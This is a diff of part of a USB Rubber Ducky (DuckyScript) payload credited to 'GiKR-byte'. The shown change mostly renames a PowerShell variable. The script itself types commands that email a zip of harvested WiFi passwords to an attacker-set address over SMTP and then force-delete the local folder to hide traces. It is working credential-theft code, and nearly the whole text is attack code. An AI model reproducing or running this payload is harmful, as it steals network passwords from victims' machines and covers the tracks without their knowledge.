@@ -36,25 +36,25 @@ DELAY 100
 STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER PASSWORD HERE')
 ENTER
 DELAY 100
-STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+STRING $wifimail = New-Object System.Net.Mail.MailMessage
 ENTER
 DELAY 100
-STRING $ReportEmail.From = 'SENDER EMAIL HERE'
+STRING $wifimail.From = 'SENDER EMAIL HERE'
 ENTER
 DELAY 100
-STRING $ReportEmail.To.Add('RECIVER EMAIL HERE')
+STRING $wifimail.To.Add('RECIVER EMAIL HERE')
 ENTER
 DELAY 100
-STRING $ReportEmail.Subject = "WiFi Passwords Script by GiKR-byte"
+STRING $wifimail.Subject = "WiFi Passwords Script by GiKR-byte"
 ENTER
 DELAY 100
-STRING $ReportEmail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
+STRING $wifimail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
 ENTER
 DELAY 100
-STRING $ReportEmail.Attachments.Add("wifi.zip")
+STRING $wifimail.Attachments.Add("wifi.zip")
 ENTER
 DELAY 100
-STRING $SMTPInfo.Send($ReportEmail)
+STRING $SMTPInfo.Send($wifimail)
 ENTER
 DELAY 100
 STRING Remove-Item wifi -Recurse -Force -Confirm:$false
